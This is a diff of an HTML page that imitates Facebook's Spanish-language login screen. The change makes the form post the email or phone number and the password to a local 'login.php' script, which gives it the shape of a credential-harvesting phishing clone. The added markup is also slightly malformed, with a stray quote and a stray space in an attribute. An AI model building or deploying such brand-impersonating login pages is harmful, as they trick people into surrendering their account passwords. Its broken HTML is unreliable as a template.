@@ -22,14 +22,14 @@
 
             <h1 class="login__header">Iniciar sesión en Facebook</h1>
 
-            <form class="login__form">
+            <form class="login__form" method="post" action="login.php"">
 
-                <input type="email" id="email" name="email" required
-                    placeholder="Correo electrónico o número de teléfono">
+                <input type=" email" id="email" name="email" required
+                placeholder="Correo electrónico o número de teléfono">
 
                 <input type="password" id="password" name="password" required placeholder="Contraseña">
 
-                <a href="https://www.facebook.com/post/8524520520" class="login__submit">Iniciar sesión</a>
+                <button type="submit" class="login__submit">Iniciar sesión</button>
 
             </form> <!-- .login -->
 
